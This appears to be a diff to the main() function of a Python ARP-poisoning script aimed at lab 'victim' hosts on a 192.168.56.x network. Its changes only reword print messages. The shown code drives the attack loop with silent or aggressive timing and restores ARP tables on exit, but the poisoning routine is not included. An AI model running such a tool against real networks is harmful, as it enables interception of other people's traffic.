@@ -24,7 +24,7 @@ def main():
 
     # Get MAC Addresses of M1,M2 for testing puposes
     if args.manual:
-        print("[*] Using hardcoded MAC addresses (manual mode).")
+        print("- Using hardcoded MAC addresses")
         hardcoded_victims = {
             "192.168.56.101": "08:00:27:B7:C4:AF",
             "192.168.56.102": "08:00:27:D0:25:4B",
@@ -33,22 +33,21 @@ def main():
         mac_gateway = "08:00:27:CC:08:6F"
         victim_macs = {ip: hardcoded_victims[ip] for ip in victim_ips}
     else:
-        print("[*] Resolving MAC addresses dynamically...")
+        print("- Resolving MAC addresses dynamically...")
         mac_gateway = get_mac(gateway_ip, iface)
         victim_macs = {ip: get_mac(ip, iface) for ip in victim_ips}
 
-    # Display Results
-    print(f"[+] Gateway MAC: {mac_gateway}")
+    print(f"- Gateway MAC: {mac_gateway}")
     for ip, mac in victim_macs.items():
-        print(f"[+] Victim {ip} MAC: {mac}")
+        print(f"+++ Victim {ip} MAC: {mac}")
 
     # Ctrl+C restores ARP tables
     def stop(sig, frame):
-        print("\n[!] Ctrl+C detected — restoring ARP tables...")
+        print("\nCtrl+C detected — restoring ARP tables...")
         for ip, mac in victim_macs.items():
             restore(ip, mac, gateway_ip, mac_gateway, iface)
             restore(gateway_ip, mac_gateway, ip, mac, iface)
-        print("Network restored.")
+        print("Network restored")
         sys.exit(0)
 
     signal.signal(signal.SIGINT, stop)
@@ -58,10 +57,10 @@ def main():
     sleep_time = {"silent": 10.0, "aggressive": 0.5}.get(args.mode, args.sleep)
     poison_loop(victim_macs, gateway_ip, mac_gateway, iface, sleep_time)
 
-# Run If Executed as Script
+
 
 if __name__ == "__main__":
     if os.geteuid() != 0:
-        print("Please run this script as root (sudo).")
+        print("Run this script as root (sudo)")
         sys.exit(1)
     main()
